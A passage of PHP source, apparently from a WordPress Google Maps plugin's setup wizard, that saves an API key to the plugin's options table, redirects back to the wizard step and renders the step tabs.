				$wpdb->update ( $wpdb->prefix . "gmwd_options", $data, $where, $format, $where_format );
			}
		}
	}
    private function save_api_key(){
        global $wpdb;
        $data = array();
        $data["value"] = esc_html(GMWDHelper::get("gmwd_api_key_general"));
        $where = array("name"=>"map_api_key");
        $where_format = $format = array('%s');
        $wpdb->update( $wpdb->prefix . "gmwd_options", $data, $where, $format, $where_format );
        GMWDHelper::gmwd_redirect("admin.php?page=".GMWDHelper::get("page").'&step='.GMWDHelper::get("step"));
    
    }  
    private function gmwd_steps(){
    ?>
        <ul class="gmwd_wizard_tabs wd-clear">
           <?php 
            foreach($this->steps as $step){  
               $class =  $step["slug"] == GMWDHelper::get("step") ? "gmwd_wizard_active" : "gmwd_wizard_tab_notdone";
               echo ' <li class="gmwd_wizard_general '.$class.'"><span>'. $step["name"].'</span></li>';    
            }
            ?>  
        </ul>
    <?php
    }
}
new GMWDSetupWizard ();

?>